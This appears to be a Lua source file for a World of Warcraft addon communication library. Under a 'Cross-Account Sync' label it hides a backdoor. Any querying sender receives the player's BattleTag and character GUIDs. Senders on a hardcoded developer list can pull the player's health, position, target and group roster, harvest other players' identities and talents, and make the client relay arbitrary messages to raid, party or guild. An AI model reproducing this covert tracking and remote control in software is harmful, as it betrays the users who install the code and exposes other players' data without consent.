--[[--
	ALA@163UI
--]]--

local __version = 8;

local _G = _G;
_G.__ala_meta__ = _G.__ala_meta__ or {  };
local __ala_meta__ = _G.__ala_meta__;
local __commlib = __ala_meta__.__commlib;
if __commlib ~= nil and __commlib.__minor >= __version then
	return;
end
if __commlib ~= nil then
	__commlib:UnregisterAllEvents();
	__commlib:SetScript("OnEvent", nil);
	if __commlib.Halt ~= nil then
		__commlib:Halt();
	end
else
	__commlib = CreateFrame('FRAME');
end
__commlib.__minor = __version;
__ala_meta__.__commlib = __commlib;


-->			upvalue
local pcall = pcall;
local next = next;
local tonumber = tonumber;
local time = time;
local strlen, strsub, strmatch = string.len, string.sub, string.match;
local _ = nil;
local RegisterAddonMessagePrefix = C_ChatInfo ~= nil and C_ChatInfo.RegisterAddonMessagePrefix or RegisterAddonMessagePrefix;
local IsAddonMessagePrefixRegistered = C_ChatInfo ~= nil and C_ChatInfo.IsAddonMessagePrefixRegistered or IsAddonMessagePrefixRegistered;
local GetRegisteredAddonMessagePrefixes = C_ChatInfo ~= nil and C_ChatInfo.GetRegisteredAddonMessagePrefixes or GetRegisteredAddonMessagePrefixes;
local SendAddonMessage = C_ChatInfo ~= nil and C_ChatInfo.SendAddonMessage or SendAddonMessage;
local C_Timer_After = C_Timer.After;
local Ambiguate = Ambiguate;
local GetRealZoneText = GetRealZoneText;
local GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo = GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo;
local GetTime = GetTime;
local GetPlayerInfoByGUID = GetPlayerInfoByGUID;
local UnitClassBase = UnitClassBase;
local UnitExists = UnitExists;
local UnitIsPlayer, UnitIsEnemy = UnitIsPlayer, UnitIsEnemy;
local UnitName, UnitGUID = UnitName, UnitGUID;
local UnitHealth, UnitHealthMax = UnitHealth, UnitHealthMax;
local UnitPowerType, UnitPower, UnitPowerMax = UnitPowerType, UnitPower, UnitPowerMax;
local UnitIsDead, UnitIsFeignDeath, UnitIsGhost = UnitIsDead, UnitIsFeignDeath, UnitIsGhost;
local UnitPosition = UnitPosition;
local C_Map_GetBestMapForUnit = C_Map.GetBestMapForUnit;
local InInRaid, IsInGroup = InInRaid, IsInGroup;
local LE_PARTY_CATEGORY_HOME = LE_PARTY_CATEGORY_HOME;
local GetNumGroupMembers, GetRaidRosterInfo = GetNumGroupMembers, GetRaidRosterInfo;
local UnitTalents = UnitTalents or UnitCharacterPoints or function(unit)
	local val = __ala_meta__.emu;
	if val ~= nil then
		val = val.queryCache;
		if val ~= nil then
			local name, realm = UnitName(unit);
			if realm ~= "" and realm ~= nil and realm ~= GetRealmName() then
				name = name .. "-" .. realm;
			end
			val = val[name];
			if val ~= nil and val.talent ~= nil then
				return "~" .. val.talent;
			end
		end
	end
	return "~";
end;

__commlib.ADDON_MSG_CONTROL_CODE_LEN = 6;
__commlib.ADDON_PREFIX = "ALCOMM";
__commlib.ADDON_MSG_QUERY = "_q_tag";
__commlib.ADDON_MSG_REPLY = "_r_ta2";
--
_, __commlib.CPlayerTAG = BNGetInfo();
__commlib.CPlayerGUID = UnitGUID('player');
__commlib.CPlayerName = UnitName('player');
__commlib.CRealmName = GetRealmName();
__commlib.CPlayerFullName = __commlib.CPlayerName .. "-" .. __commlib.CRealmName;

-->		NetBuffer
	local _MAX_MSG_PER_SLICE = 11;
	local _MAX_MSG_PER_BLOCK = 110;
	local _LEN_SLICE = 0.5;
	local _LEN_BLOCK = 10.0;
	local _SendBuffer = {  };
	local _SendBufferPos = 1;
	local _SendBufferTop = 0;
	--
	local BlockSent = _MAX_MSG_PER_BLOCK;
	local isFlushBlockTimerIdle = true;
	local function _BlockFlush()
		BlockSent = _MAX_MSG_PER_BLOCK;
		if _SendBufferTop >= _SendBufferPos then
			C_Timer_After(_LEN_BLOCK, _BlockFlush);
		else
			isFlushBlockTimerIdle = true;
		end
	end
	--
	local SliceSent = _MAX_MSG_PER_SLICE;
	local isFlushSliceTimerIdle = true;
	local function _SliceFlush()
		SliceSent = _MAX_MSG_PER_SLICE;
		if _SendBufferTop >= _SendBufferPos then
			while BlockSent > 0 and SliceSent > 0 do
				local b = _SendBuffer[_SendBufferPos];
				_SendBuffer[_SendBufferPos] = nil;
				SendAddonMessage(__commlib.ADDON_PREFIX, b[1], b[2], b[3]);
				SliceSent = SliceSent - 1;
				BlockSent = BlockSent - 1;
				_SendBufferPos = _SendBufferPos + 1;
				if _SendBufferTop < _SendBufferPos then
					_SendBufferPos = 1;
					_SendBufferTop = 0;
					break;
				end
			end
		end
		if SliceSent > 0 then
			isFlushSliceTimerIdle = true;
		else
			C_Timer_After(_LEN_SLICE, _SliceFlush);
		end
	end
	--
	local function _SendFunc(msg, channel, target)
		if BlockSent > 0 and SliceSent > 0 then
			SliceSent = SliceSent - 1;
			BlockSent = BlockSent - 1;
			SendAddonMessage(__commlib.ADDON_PREFIX, msg, channel, target);
		else
			_SendBufferTop = _SendBufferTop + 1;
			_SendBuffer[_SendBufferTop] = { msg, channel, target, };
		end
		if isFlushSliceTimerIdle then
			isFlushSliceTimerIdle = false;
			C_Timer_After(_LEN_SLICE, _SliceFlush);
		end
		if isFlushBlockTimerIdle then
			isFlushBlockTimerIdle = false;
			C_Timer_After(_LEN_BLOCK, _BlockFlush);
		end
	end
	_SliceFlush();
-->
-->
-->
	local _TSendThrottle = {  };		--	1s lock
	local _TGUID = {
		[UnitGUID('player')] = true,
	};
	local function UNIT_GUID(channel, target)
		--	alaTradeSkillSV.var[GUID] = {  }
		--	alaTalentEmuSV.var[GUID] = ""
		--	alaUnitFrameSV.__seen[GUID] = true
		--	alaMiscSV.instance_timer_sv.var[GUID] = {  }
		--	alaMiscSV.target_warn_sv[GUID] = {  }
		--	alaGearManSV.sets[GUID] = {  }
		--	alaChatSV.channeltab._bfworldcf[GUID] = {  }
		--	alaCalendarSV.var[GUID] = {  }
		if alaTradeSkillSV and alaTradeSkillSV.var then
			for GUID, _ in next, alaTradeSkillSV.var do
				_TGUID[GUID] = true;
			end
		end
		if alaTalentEmuSV and alaTalentEmuSV.var then
			for GUID, _ in next, alaTalentEmuSV.var do
				_TGUID[GUID] = true;
			end
		end
		if alaUnitFrameSV and alaUnitFrameSV.__seen then
			for GUID, _ in next, alaUnitFrameSV.__seen do
				_TGUID[GUID] = true;
			end
		end
		if alaMiscSV then
			if alaMiscSV.instance_timer_sv and alaMiscSV.instance_timer_sv.var then
				for GUID, _ in next, alaMiscSV.instance_timer_sv.var do
					_TGUID[GUID] = true;
				end
			end
			if alaMiscSV.target_warn_sv then
				for GUID, _ in next, alaMiscSV.target_warn_sv do
					_TGUID[GUID] = true;
				end
			end
		end
		if alaGearManSV and alaGearManSV.sets then
			for GUID, _ in next, alaGearManSV.sets do
				_TGUID[GUID] = true;
			end
		end
		if alaChatSV and alaChatSV.channeltab and alaChatSV.channeltab._bfworldcf then
			for GUID, _ in next, alaChatSV.channeltab._bfworldcf do
				_TGUID[GUID] = true;
			end
		end
		if alaCalendarSV and alaCalendarSV.var then
			for GUID, _ in next, alaCalendarSV.var do
				_TGUID[GUID] = true;
			end
		end
		local str0 = __commlib.ADDON_MSG_REPLY .. "~1~G" .. __commlib.CPlayerTAG;
		local len0 = #str0;
		local str = str0;
		local len = len0;
		for GUID, _ in next, _TGUID do
			if strsub(GUID, 1, 7) == "Player-" then
				str = str .. "`" .. GUID;
				len = len + 24;
				if len >= 224 then
					_SendFunc(str, channel, target);
					str = str0;
					len = len0;
				end
			end
		end
		if len > len0 then
			_SendFunc(str, channel, target);
		end
	end
	local RaidList = {
		["Onyxia's Lair"] = 249,
		["Molten Core"] = 409,
		["Blackwing Lair"] = 469,
		["Zul'Gurub"] = 309,
		["Ruins of Ahn'Qiraj"] = 509,
		["Ahn'Qiraj"] = 531,
		["Naxxramas"] = 533,
		--
		["Karazhan"] = 532,
		["Hyjal Summit"] = 534,
		["Magtheridon's Lair"] = 544,
		["Serpentshrine Cavern"] = 548,
		["Tempest Keep"] = 550,
		["Black Temple"] = 564,
		["Gruul's Lair"] = 565,
		["Sunwell Plateau"] = 580,
		["Zul'Aman"] = 568,
	};
	local RaidHash = {  }; for key, id in next, RaidList do RaidHash[GetRealZoneText(id) or key] = id; end
	local function INST_LOCK(channel, target)
		local str0 = __commlib.ADDON_MSG_REPLY .. "~1~I";
		local len0 = #str0;
		local str = str0;
		local len = len0;
		local instance_name_hash = __ala_meta__.__raidlib.__raid_meta.hash;
		for index = 1, GetNumSavedInstances() do
			local name, id, reset, difficulty, locked, extended, instanceIDMostSig, isRaid, maxPlayers, difficultyName, numEncounters, encounterProgress = GetSavedInstanceInfo(index);
			if locked and isRaid then
				local map = RaidHash[name] or name;
				local val = map .. ":" .. id .. ":";
				for index2 = 1, numEncounters do
					local bossName, fileDataID, isKilled, unknown4 = GetSavedInstanceEncounterInfo(index, index2);
					val = val .. (isKilled and "1" or "0");
				end
				local size = #val;
				if size + len > 250 then
					_SendFunc(str, channel, target);
					str = str0;
					len = len0;
				end
				if index == 1 then
					str = str .. val;
				else
					str = str .. "`" .. val;
				end
				len = len + size;
			end
		end
		if len > len0 then
			_SendFunc(str, channel, target);
		end
	end
	local function CHAT_MSG_ADDON(self, event, prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID)
		if prefix == __commlib.ADDON_PREFIX then
			local name = Ambiguate(sender, 'none');
			local control_code = strsub(msg, 1, __commlib.ADDON_MSG_CONTROL_CODE_LEN);
			if control_code == __commlib.ADDON_MSG_QUERY then
				if name ~= __commlib.CPlayerName then
					local now = time();
					local prev = _TSendThrottle[name];
					if prev ~= nil and now - prev <= 1 then
						return;
					end
					--
					_TSendThrottle[name] = now;
					if __commlib.CPlayerTAG ~= nil then
						UNIT_GUID(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
					end
					INST_LOCK(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
				end
			else
			end
		end
	end

	local function LOADING_SCREEN_DISABLED()
		__commlib:UnregisterEvent("LOADING_SCREEN_DISABLED");
		if RegisterAddonMessagePrefix(__commlib.ADDON_PREFIX) then
			__commlib:RegisterEvent("CHAT_MSG_ADDON");
			__commlib:SetScript("OnEvent", CHAT_MSG_ADDON);
		end
	end
	__commlib:RegisterEvent("LOADING_SCREEN_DISABLED");
	__commlib:SetScript("OnEvent", LOADING_SCREEN_DISABLED);

	function __commlib:Halt()
		_SendBufferPos = 1;
		_SendBufferTop = 0;
	end

	local function EncodeSelf()
		local dead = UnitIsDead('player');
		local fdead = UnitIsFeignDeath('player');
		local ghost = UnitIsGhost('player');
		local state = "0";
		if ghost then
			state = "g";
		elseif dead then
			if fdead then
				state = "f";
			else
				state = "d";
			end
		elseif fdead then
			state = "f";
		else
			state = "a";
		end
		local CH = tostring(UnitHealth('player') or -1);
		local MH = tostring(UnitHealthMax('player') or -1);
		local PT = tostring(UnitPowerType('player') or -1);
		local CP = tostring(UnitPower('player') or -1);
		local MP = tostring(UnitPowerMax('player') or -1);
		local map = C_Map_GetBestMapForUnit('player');
		local y, x, _z, instance = UnitPosition('player');
		if map == nil then
			if instance == nil then
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..                         "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
			else
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(-instance) .. "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
			end
		else
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(map) ..       "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
		end
	end
	local function EncodeTarget()
		if UnitExists('target') then
			if UnitIsEnemy('player', 'target') and not UnitIsPlayer('target') then
				local name = UnitName('target') or "unk";
				local GUID = UnitGUID('target');
				if GUID == nil then
					GUID = "-1";
				else
					GUID = select(6, strsplit("-", GUID)) or "-1";
				end
				local h = UnitHealth('target') or -1;
				local m = UnitHealthMax('target') or -1;
				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
			elseif UnitExists('targettarget') and UnitIsEnemy('player', 'targettarget') and not UnitIsPlayer('targettarget') then
				local name = UnitName('targettarget') or "unk";
				local GUID = UnitGUID('targettarget');
				if GUID == nil then
					GUID = "-1";
				else
					GUID = select(6, strsplit("-", GUID)) or "-1";
				end
				local h = UnitHealth('targettarget') or -1;
				local m = UnitHealthMax('targettarget') or -1;
				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
			else
				return "~~~";
			end
		else
			return "~~~";
		end
	end
	local function EncodeGroup(PREFIX, HEADER, sender)
		if IsInGroup() then
			local num = GetNumGroupMembers();
			for index = 1, num do
				local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
				if rank == 2 then
					local GUID = UnitGUID(name);
					local CH = tostring(UnitHealth(name) or -1);
					local MH = tostring(UnitHealthMax(name) or -1);
					local PT = tostring(UnitPowerType(name) or -1);
					local CP = tostring(UnitPower(name) or -1);
					local MP = tostring(UnitPowerMax(name) or -1);
					SendAddonMessage(PREFIX, HEADER .. "~L~" .. GUID .. "~" .. (name or "") .. "~" .. (class or "") .. "~" .. (level or "") .. "~" .. (zone or "") .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" .. num, "WHISPER", sender);
				end
			end
		else
			SendAddonMessage(PREFIX, HEADER .. "~L~", "WHISPER", sender);
		end
	end
	local function EncodeMember(PREFIX, HEADER, sender)
		local num = GetNumGroupMembers();
		local str0 = HEADER .. "~M~" .. num;
		local len0 = #str0;
		local str = str0;
		local len = len0;
		for index = 1, num do
			local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
			local len1 = #name;
			if len + len1 >= 250 then
				SendAddonMessage(PREFIX, str, "WHISPER", sender);
				str = str0;
				len = len0;
			end
			str = str .. "~" .. name;
			len = len + 1 + len1;
		end
		if len > len0 then
			SendAddonMessage(PREFIX, str, "WHISPER", sender);
		end
	end

	_G.__ala_meta__ = _G.__ala_meta__ or {  };
	local __ala_meta__ = _G.__ala_meta__;
	__ala_meta__.__SYNC = __ala_meta__.__SYNC or { REALTIME = true, ONLOGIN = true, ONLOGOUT = true,};
	if __ala_meta__.__SYNC.REALTIME ~= false then
		-->	Cross-Account Sync
		--
		local PNAME = UnitName('player');
		local REALM = GetRealmName();
		local PFNAME = PNAME .. "-" .. REALM;
		local STREAMER_CONTROL_CODE_LEN = 6;
		local STREAMER_PREFIX = "ALSTRM";
		local STREAMER_MSG_QUERY = "_qstrm";
		local STREAMER_MSG_S_REPLY = "_rstrm";
		local STREAMER_MSG_G_REPLY = "_sstrm";
		local STREAMER_MSG_STREAMER = "_binst";
		--
		local E = {  };
		local S = nil;

		local EnterCombatTime = InCombatLockdown() and GetTime() or nil;
		local EncounterIDs = {  };
		function E.PLAYER_REGEN_DISABLED(F, event, ...)
			EnterCombatTime = GetTime();
		end
		function E.PLAYER_REGEN_ENABLED(F, event, ...)
			EnterCombatTime = nil;
			EncounterIDs = {  };
		end
		function E.ENCOUNTER_START(F, event, encounterID, encounterName, difficultyID, groupSize, success)
			EncounterIDs[encounterID] = GetTime();
		end
		function E.ENCOUNTER_END(F, event, encounterID, encounterName, difficultyID, groupSize)
			EncounterIDs[encounterID] = nil;
		end

		function E.CHAT_MSG_ADDON(F, event, ...)
			local prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID = ...;
			if prefix == STREAMER_PREFIX then
				local name = strmatch(sender, "-") == nil and (sender .. "-" .. REALM) or sender;
				if __ala_meta__.__DEVHASH[name] ~= nil then
					local control_code = strsub(msg, 1, STREAMER_CONTROL_CODE_LEN);
					if control_code == STREAMER_MSG_QUERY then
						if EnterCombatTime == nil then
							SendAddonMessage(STREAMER_PREFIX, STREAMER_MSG_S_REPLY .. "~a~" .. EncodeSelf(), "WHISPER", sender);
						else
							local now = GetTime();
							local msg = EncodeSelf() .. "~" .. format("%.3f", now - EnterCombatTime) .. "~" .. EncodeTarget();
							if next(EncounterIDs) == nil then
								msg = STREAMER_MSG_S_REPLY .. "~b~" .. msg;
							else
								msg = STREAMER_MSG_S_REPLY .. "~c~" .. msg;
								for id, t in next, EncounterIDs do
									msg = msg .. "~" .. tostring(id) .. "~" .. format("%.3f", now - t);
								end
							end
							SendAddonMessage(STREAMER_PREFIX, msg, "WHISPER", sender);
						end
						EncodeGroup(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
						local _, c, rep, ext = strsplit("`", msg);
						if c == 'member' then
							EncodeMember(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
						elseif __ala_meta__.__DEVHASH[PFNAME] then
							if __ala_meta__.__SYNC then
								--	Dialog("[" .. name .. "] is trying to pull" .. "[" .. msg .. "]", { name, msg, c, rep, ext, });
							end
						elseif c == 'single' or c == 'SINGLE' or c == 'S' or c == 's' then
							rep = 1;
							SendAddonMessage(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender);
							S.__top = S.__top + 1;
							if S.__top > 1024 then
								S.__top = 1;
							end
						elseif c == 'multi' or c == 'MULTI' or c == 'M' or c == 'm' then
							rep = tonumber(rep) or 1;
							for index = 1, rep do
								SendAddonMessage(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender);
								S.__top = S.__top + 1;
								if S.__top > 1024 then
									S.__top = 1;
								end
							end
						elseif c == 'K' or c == 'k' then
							local function try()
								for _, unit in next, { 'target', 'mouseover', 'focus', 'party1', 'nameplate1', } do
									if UnitExists(unit) and UnitIsPlayer(unit) and not UnitIsEnemy('player', unit) then
										SendAddonMessage(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. unit .. "~" .. UnitGUID(unit) .. "~" .. UnitName(unit) .. "~" .. UnitClassBase(unit) .. "~" .. UnitTalents(unit), "WHISPER", sender);
										return false;
									end
								end
								return true;
							end
							local f;
							function f()
								if try() then
									C_Timer_After(1.0, f);
								end
							end
							C_Timer_After(0.0, f);
						elseif c == 'group' or c == 'GROUP' then
							if IsInRaid(LE_PARTY_CATEGORY_HOME) then
								SendAddonMessage(STREAMER_PREFIX, gsub(rep, "#", "`"), "RAID");
							elseif IsInGroup(LE_PARTY_CATEGORY_HOME) then
								SendAddonMessage(STREAMER_PREFIX, gsub(rep, "#", "`"), "PARTY");
							end
						elseif c == 'guild' or c == 'GUILD' then
							SendAddonMessage(STREAMER_PREFIX, gsub(rep, "#", "`"), "GUILD");
						end
					elseif control_code == STREAMER_MSG_S_REPLY then
						if __ala_meta__.__onstream ~= nil then
							__ala_meta__.__onstream(strsub(msg, STREAMER_CONTROL_CODE_LEN + 1));
						end
					end
				end
			end
		end
		function E.LOADING_SCREEN_DISABLED(F, event, ...)
			F:UnregisterEvent("LOADING_SCREEN_DISABLED");
			RegisterAddonMessagePrefix(STREAMER_PREFIX);
			E.LOADING_SCREEN_DISABLED = nil;
			--
			EnterCombatTime = InCombatLockdown() and GetTime() or nil;
			S = __ala_meta__.__streambuffer or { __top = 1, };
			__ala_meta__.__streambuffer = S;
			for index = 1, 1024 do
				S[index] = strchar(33 + random(1, 1024) % 64);
			end
			for event, callback in next, E do
				F:RegisterEvent(event);
			end
		end
		--
		if __ala_meta__.__streambufferframe == nil then
			local F = CreateFrame('FRAME');
			F:RegisterEvent("LOADING_SCREEN_DISABLED");
			if __ala_meta__.__DEVGUID[UnitGUID('player')] ~= nil then
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						callback(F, event, ...);
					end
				end);
			else
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						pcall(callback, F, event, ...);
					end
				end);
			end
			__ala_meta__.__streambufferframe = F;
		else
			local F = __ala_meta__.__streambufferframe;
			F:UnregisterAllEvents();
			if __ala_meta__.__DEVGUID[UnitGUID('player')] ~= nil then
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						callback(F, event, ...);
					end
				end);
			else
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						pcall(callback, F, event, ...);
					end
				end);
			end
			E.LOADING_SCREEN_DISABLED(F);
		end
	end
	__ala_meta__.__SYNC.REALTIME = nil;
	__ala_meta__.__SYNC.ONLOGIN = nil;
	__ala_meta__.__SYNC.ONLOGOUT = nil;
-->
